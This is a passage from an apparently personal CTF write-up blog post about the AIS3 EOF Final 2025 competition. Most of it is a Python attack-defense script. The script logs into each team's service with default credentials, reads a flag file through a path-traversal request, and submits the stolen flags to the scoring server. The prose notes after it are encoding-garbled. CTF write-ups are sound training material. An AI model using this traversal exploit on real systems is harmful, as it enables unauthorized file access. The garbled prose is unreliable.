class="string">&#x27;----WebKitFormBoundary7MA4YWxkTrZu0gW&#x27;</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">f&#x27;multipart/form-data; boundary=<span class="subst">&#123;boundary&#125;</span>&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = (</span><br><span class="line">        <span class="string">f&#x27;--<span class="subst">&#123;boundary&#125;</span>\r\n&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;Content-Disposition: form-data; name=&quot;username&quot;\r\n\r\n&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;user\r\n&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;--<span class="subst">&#123;boundary&#125;</span>\r\n&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;Content-Disposition: form-data; name=&quot;password&quot;\r\n\r\n&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;user\r\n&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;--<span class="subst">&#123;boundary&#125;</span>--\r\n&#x27;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    sess = requests.session()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = sess.post(url, headers=headers, data=data, timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Team <span class="subst">&#123;i&#125;</span> failed&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span></span><br><span class="line">    response = sess.get(<span class="string">f&#x27;http://<span class="subst">&#123;host&#125;</span>:5000/app.php?app=files/download&amp;volume=public&amp;dir=../../../..&amp;file=fl4g&#x27;</span>, timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line">    <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target_url = <span class="string">&quot;http://35.221.181.38:8888/flag/&quot;</span></span><br><span class="line">token = <span class="string">&quot;298956eca545bc623493bac595eb72e1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">13</span>):</span><br><span class="line">    host=<span class="string">f&quot;10.102.<span class="subst">&#123;i&#125;</span>.60&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    stdout_data = attack(host)</span><br><span class="line">    pattern = <span class="string">r&quot;EOF[a-zA-Z0-9]&#123;29&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">match</span> = re.search(pattern, stdout_data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        flag = <span class="keyword">match</span>.group(<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Found Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>, flush=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        payload = &#123;</span><br><span class="line">            <span class="string">&quot;flags&quot;</span>: [flag],</span><br><span class="line">            <span class="string">&quot;token&quot;</span>: token</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        response = requests.post(target_url, json=payload)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Flag Submitted: <span class="subst">&#123;target_url&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Submit Failed: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Found Flag QwQ&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>æœ€å¾Œå¹¾ä»¶äº‹ï¼š<br>3. Game å…¶å¯¦æ˜¯è¦ç”¨è‡ªå·±ç•¶ä¸‹æœ‰çš„é“å…·çš„ Byte çµ„åˆå‡º ARM çµ„èªå®Œæˆä»»å‹™ä¾†å–å¾—åˆ†æ•¸<br>4. Jeopardy æœ€å¾Œä¸€é¡Œ pwn è¦ SQLIï¼Œæ”¹è®Šå¤§å° Overlapping æ‰“ Tcache Poisoningï¼Œå…¶å¯¦æˆ‘æœ‰é€šéˆå‡ºä¾†ä½†ï¼Œ @ Aukro ç•¶ä¸‹é€†å¥½åƒæ²’çœ‹åˆ°èƒ½é€™æ¨£åˆ©ç”¨çš„é»?!  </p>
<p>åˆé¤<br><img src="https://hackmd.io/_uploads/HycN92SYye.png" alt="image">  </p>
<p>æ™šé¤<br><img src="https://hackmd.io/_uploads/SyASc3HFyg.png" alt="image"></p>
<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>é€™æ¬¡æ¯”è³½æ¯”æƒ³åƒä¸­è‚ï¼Œä½†å¥½åƒä¹Ÿè »æ„œæ„??<br>å†æ¬¡å¯«å¯«å„ä½éšŠå‹å’Œç”¨å¿ƒçš„ä¸»è¾¦æ–¹ æˆ‘ç©å¾—å¾ˆé–‹å¿ƒ!<br>é †ä¾¿å¸¶èµ°ä¸€ä»¶ DEFCON è¡£æœç•¶çå“ wï¼Œä¸çŸ¥é“ä¹‹å¾Œæ‰“ä¸æ‰“çš„åˆ°â€¦åŠ æ²¹åŠ æ²¹!<br>æœ€å¾Œåˆ†æ•¸ç‰ˆï¼Œ Crypto å’Œæ•£æ­¥å¤§æˆåŠŸ<br><img src="https://hackmd.io/_uploads/S13ZqhBtkl.png" alt="image">  </p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Infra"><span class="toc-number">2.</span> <span class="toc-text">Infra</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-1"><span class="toc-number">3.</span> <span class="toc-text">Day 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day1-%E6%99%9A%E4%B8%8A-Day2-%E4%B8%80%E9%96%8B%E5%A7%8B%E7%9A%84-Crypto-%E4%B9%8B%E6%97%85"><span class="toc-number">4.</span> <span class="toc-text">Day1 æ™šä¸Š ~ Day2 ä¸€é–‹å§‹çš„ Crypto ä¹‹æ—…</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#zkdlp"><span class="toc-number">4.1.</span> <span class="toc-text">zkdlp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#prsa"><span class="toc-number">4.2.</span> <span class="toc-text">prsa</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-2"><span class="toc-number">5.</span> <span class="toc-text">Day 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">6.</span> <span class="toc-text">After all</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2025/02/09/eof-final-2025/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2025/02/09/eof-final-2025/&text=AIS3 EOF FINAL 2025 Write Up"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2025/02/09/eof-final-2025/&title=AIS3 EOF FINAL 2025 Write Up"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2025/02/09/eof-final-2025/&is_video=false&description=AIS3 EOF FINAL 2025 Write Up"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=AIS3 EOF FINAL 2025 Write Up&body=Check out this article: http://wha13.github.io/2025/02/09/eof-final-2025/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2025/02/09/eof-final-2025/&title=AIS3 EOF FINAL 2025 Write Up"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2025/02/09/eof-final-2025/&title=AIS3 EOF FINAL 2025 Write Up"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2025/02/09/eof-final-2025/&title=AIS3 EOF FINAL 2025 Write Up"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2025/02/09/eof-final-2025/&title=AIS3 EOF FINAL 2025 Write Up"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2025/02/09/eof-final-2025/&name=AIS3 EOF FINAL 2025 Write Up&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2025/02/09/eof-final-2025/&t=AIS3 EOF FINAL 2025 Write Up"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    William Lin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
